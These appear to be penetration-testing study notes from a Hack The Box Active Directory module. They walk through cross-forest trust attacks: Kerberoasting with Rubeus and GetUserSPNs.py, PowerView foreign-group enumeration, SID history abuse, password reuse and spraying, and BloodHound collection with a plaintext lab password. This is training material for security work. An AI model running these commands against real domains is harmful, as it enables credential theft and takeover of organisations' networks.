In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold. Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.

We can utilize PowerView to enumerate accounts in a target domain that have SPNs associated with them.
` Enumerating Accounts for Associated SPNs Using Get-DomainUser`

```powershell-session
> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

`get user details`

```powershell-session
> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```

We see that there is one account with an SPN in the target domain. A quick check shows that this account is a member of the Domain Admins group in the target domain, so if we can Kerberoast it and crack the hash offline, we'd have full admin rights to the target domain.
`Kerbroast `

```powershell-session
> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

We could then run the hash through Hashcat. If it cracks, we've now quickly expanded our access to fully control two domains by leveraging a pretty standard attack and abusing the authentication direction and setup of the bidirectional forest trust.

## Admin Password Re-Use & Group Membership`

situation where there is a bidirectional forest trust managed by admins from the same company. If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account (or an account that is part of the Enterprise Admins or Domain Admins group in Domain A), and Domain B has a highly privileged account with the same name, then it is worth checking for password reuse across the two forests.

We may also see users or admins from Domain A as members of a group in Domain B. Only `Domain Local Groups` allow security principals from outside its forest. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.

## (`freightlogistics.local` and `blackwood.local` forests)

#### Using Get-DomainForeignGroupMember

enumerate groups with users that do not belong to the domain, also known as `foreign group membership`.

```powershell-session
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL

PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

BLACKWOOD\administrator
```

The above command output shows that the built-in Administrators group in `FREIGHTLOGISTICS.LOCAL` has the built-in Administrator account for the `blackwood.local` domain as a member. We can verify this access using the `Enter-PSSession` cmdlet to connect over WinRM.

```powershell-session
PS C:\htb> Enter-PSSession -ComputerName DC03.FREIGHTLOGISTICS.LOCAL -Credential BLACKWOOD\administrator
```

```powershell-session
PS C:\htb> Enter-PSSession -ComputerName DC03.FREIGHTLOGISTICS.LOCAL -Credential BLACKWOOD\administrator
```

# sid history abuse (cross forest)

If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust.
n the below diagram, we can see an example of the `jjones` user being migrated from the `blackwood.local` domain to the `CORP.LOCAL` domain in a different forest. If SID filtering is not enabled when this migration is made and the user has administrative privileges (or any type of interesting rights such as ACE entries, access to shares, etc.) in the `blackwood.local` domain, then they will retain their administrative rights/access in `blackwood.local` while being a member of the new domain, `CORP.LOCAL` in the second forest.

![Diagram showing trust relationship between blackwood.local and CORP.LOCAL domains, with user migration due to merger. Includes user SIDs and resources.](https://academy.hackthebox.com/storage/modules/143/sid-history.png)

cross forest kerberoasting

```shell-session
$ $ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL blackwood.local/wley -outputfile hashes_spns
```

## Hunting Foreign Group Membership with Bloodhound-python

Since only `Domain Local Groups` allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship.

On some assessments, our client may provision a VM for us that gets an IP from DHCP and is configured to use the internal domain's DNS. We will be on an attack host without DNS configured in other instances.
In this case, we would need to edit our `resolv.conf` file to run this tool since it requires a DNS hostname for the target Domain Controller instead of an IP address. We can edit the file as follows using sudo rights. Here we have commented out the current nameserver entries and added the domain name and the IP address of `DC01` as the nameserver.

## Kerberoast From linux

get accounst with SPN set

```shell-session
$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL blackwood.local/wley
```

get all TGS Tickets

```shell-session
$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL blackwood.local/wley  outputfile wley-spn
```

attempt password spray with the cracked password.

---

## Collecting BH Data for Two Different Forests

### Domain1: Modifying DNS so bloodhound-python can run

Here we have commented out the current nameserver entries and added the domain name and the IP address of `DC01` as the nameserver.

```shell-session
$ cat /etc/resolv.conf

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain blackwood.local
nameserver 172.16.5.5
```

Once this is in place, we can run the tool against the target domain as follows:

```shell-session
$ bloodhound-python -d blackwood.local -dc DC01 -c All -u forend -p Klmcargo2
```

```shell-session
zip -r ilfreight_bh.zip *.json
```

### domain2: We will repeat the same process, this time filling in the details for the `FREIGHTLOGISTICS.LOCAL` domain.

Adding DOMAIN2 Information to /etc/resolv.conf

```shell-session
$ cat /etc/resolv.conf

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

```shell-session
$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@blackwood.local -p Klmcargo2
```

After uploading the second set of data (either each JSON file or as one zip file), we can click on `Users with Foreign Domain Group Membership` under the `Analysis` tab and select the source domain as `blackwood.local`. Here, we will see the built-in Administrator account for the blackwood.local domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.

![[Pasted image 20250728013635.png]]
